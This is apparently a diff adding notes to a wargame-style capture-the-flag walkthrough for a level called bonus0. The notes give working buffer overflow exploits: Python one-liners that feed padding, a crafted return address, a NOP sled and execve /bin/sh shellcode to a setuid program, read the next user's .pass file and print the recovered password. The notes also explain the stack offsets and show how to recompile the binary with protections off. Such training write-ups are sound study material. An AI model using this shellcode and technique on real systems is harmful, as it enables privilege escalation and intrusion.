@@ -27,5 +27,87 @@ bonus1
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+// Alex's answer
+(python -c "print('A' * 4095)"; python -c "print('B' * 9 + '\xbf\xff\xe6\x7d'[::-1] + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | ~/bonus0
+
+
+(python -c "print('A' * 4095)"; python -c "print('B' * 9 + '\xbf\xff\xee\x4d'[::-1] + '\0x90' * 4000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | ~/bonus0
+
+
+
+`python -c "print('A' * 4095)"`
+`python -c "print('B' * 9 + '\xbf\xff\xe6\x7d'[::-1] + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`
+
+
+
+// shellcode
+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
+
+
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
+
+# We will overwrite return address of main to call the shellcode payload in function p()'s local buffer.
+
+# The first input will result in a non-NULL terminated string a = "AAAA...."
+
+# The second input will effectively become part of string a.
+
+# The strcpy() will result in copying 44 chars to buffer, followed by NULL terminator, because there happens to be 4 non-zero chars on the stack above end of b.
+
+# buffer is appended with ' ', now 45 chars.
+
+# strcat() appends 24 chars to buffer.
+
+# The return address payload must be at &buffer[54].
+
+# main() stack state:
+
+// return address		4 bytes
+// old ebp				4 bytes
+// esp alignment		8 bytes
+// main.buffer			42 bytes
+
+# The crafted return address will point to somewhere in the middle of the 2000 byte NOP slide preceeding the shellcode, which remains at p()'s buffer[9 + 4 + 2000].
+
+# target return address = p() buffer address (0xbfffe680) + 9 + 4 + 1000
+
+# Run the program
+(python -c "print('A' * 20)"; python -c "print('B' * 9 + '\xbf\xff\xea\x75'[::-1] + '\x90' * 2000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | ~/bonus0
+	
+	whoami
+	cat /home/user/bonus1/.pass
+
+# Now we can log in as user bonus1
+su bonus1
+# password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user bonus1:
+
+    # Compile the program in /tmp
+    gcc bonus0.c -fno-stack-protector -z execstack -o ft_bonus0
+
+    # Edit suid
+    chmod u+s ft_bonus0
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_bonus0 ~
+
+# As user bonus0:
+
+	# In this case, there happens to be 1 non-zero chars above b, so the magic offset changes to 12.
+	
+	# Run the program
+	(python -c "print('A' * 20)"; python -c "print('B' * 12 + '\xbf\xff\xea\x75'[::-1] + '\x90' * 2000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | /home/user/bonus1/ft_bonus0
 
 
